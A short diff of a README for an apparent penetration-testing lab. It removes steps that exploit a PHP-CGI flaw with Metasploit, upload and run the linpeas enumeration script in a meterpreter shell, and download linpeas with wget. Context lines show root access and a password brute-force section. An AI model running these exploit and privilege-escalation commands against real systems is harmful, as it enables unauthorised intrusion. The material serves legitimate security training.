@@ -58,28 +58,6 @@ touch you_are_pwned
 whoami #root
 ```
 
-### Data gathering
-From kali:
-```bash
-#Download linpeas.sh script
-wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
-```
-We will run the script by exploiting a php vulnerability but from a non-privileged user
-```bash
-msfconsole
-search php_cgi
-use 0
-set rhosts 172.20.0.2
-exploit
-# we get a meterpreter session
-# from here, we upload the linpeas script to the victim
-upload linpeas.sh .
-shell #we open a shell in victim
-ls #check file was uploaded successfully
-chmod 777 linpeas.sh
-./linpeas.sh
-```
-
 ### Password brute force
 From kali:
 ```bash
@@ -100,16 +78,7 @@ make down
 
 
 ## Demo
-
-```
-# Use a linpeas binary
-```
-
 From kali:
-```bash
-#Download linpeas.sh script
-wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
-```
 
 We will run the script by exploiting a php vulnerability but from a non-privileged user
 ```bash
